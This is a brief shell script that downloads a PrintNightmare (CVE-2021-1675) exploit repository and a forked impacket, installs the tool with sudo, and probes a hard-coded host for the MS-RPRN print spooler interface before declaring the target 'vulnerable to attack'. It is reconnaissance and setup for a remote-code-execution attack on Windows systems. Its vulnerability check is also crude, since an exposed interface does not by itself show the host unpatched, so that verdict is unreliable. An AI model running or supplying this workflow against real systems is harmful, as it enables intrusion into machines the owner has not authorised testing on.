git clone https://github.com/cube0x0/CVE-2021-1675.git
git clone https://github.com/cube0x0/impacket.git

cd impacket

sudo python3 setup.py install
# sudo python3 examples/rpcdump.py @172.168.1.4 | grep MS-RPRN
if sudo python3 examples/rpcdump.py @172.168.1.4 | grep MS-RPRN
then
	echo "Target is vulnerable to attack"
else
	exit 1
fi
